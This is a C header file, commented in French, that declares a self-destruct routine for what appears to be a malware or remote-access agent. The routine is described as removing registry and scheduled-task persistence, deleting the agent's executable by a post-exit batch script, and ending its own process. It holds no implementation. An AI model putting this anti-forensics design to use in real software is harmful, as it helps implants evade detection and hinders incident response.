/*
 * destruct.h - Handler d'auto-destruction de l'agent
 * 
 * Supprime toutes les traces de l'agent :
 * - Entrées de persistence (registry, scheduled tasks)
 * - Fichiers sur disque
 * - Processus de l'agent
 */

#ifndef DESTRUCT_H
#define DESTRUCT_H

/*
 * Execute l'auto-destruction complète de l'agent.
 * 
 * Étapes :
 * 1. Supprime les entrées de persistence
 * 2. Prépare un script batch pour supprimer l'exécutable après terminaison
 * 3. Nettoie la mémoire
 * 4. Termine le processus
 * 
 * Return: 0 en cas de succès (ne devrait jamais retourner normalement)
 */
int handle_self_destruct(void);

/*
 * Supprime uniquement les entrées de persistence sans tuer l'agent.
 * Utile pour un nettoyage partiel.
 * 
 * Return: Nombre d'entrées supprimées
 */
int destruct_remove_persistence(void);

#endif /* DESTRUCT_H */
